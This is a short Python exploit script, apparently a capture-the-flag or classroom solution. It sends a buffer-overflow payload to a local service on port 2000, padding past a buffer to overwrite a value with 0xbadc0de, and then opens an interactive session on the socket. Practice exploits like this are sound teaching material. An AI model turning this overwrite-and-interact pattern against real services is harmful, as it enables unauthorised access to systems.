#!/usr/bin/python3

import socket
import telnetlib
import sys

s = socket.create_connection(('localhost', 2000))

# Write into buffer
val = b"0" * 32 + b"I can use buffer overflows!\0" + b"0" * 12 + 0xbadc0de.to_bytes(8, 'little') + b"\n"
s.send(val)
print(s.recv(2048).decode('ASCII'))

t = telnetlib.Telnet()
t.sock = s
t.interact()

s.close()
